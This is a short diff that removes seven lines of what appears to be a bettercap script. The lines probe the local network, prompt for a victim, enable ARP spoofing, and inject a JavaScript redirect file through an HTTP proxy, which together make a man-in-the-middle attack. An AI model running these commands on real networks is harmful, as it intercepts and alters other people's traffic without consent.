@@ -1,7 +1,0 @@
-net.probe on
-sleep 5
-net.show
-read arp.spoof.targets Select ARP Target (victim):
-arp.spoof on
-set http.proxy.injectjs /home/nmp/redirectscript.js
-http.proxy on
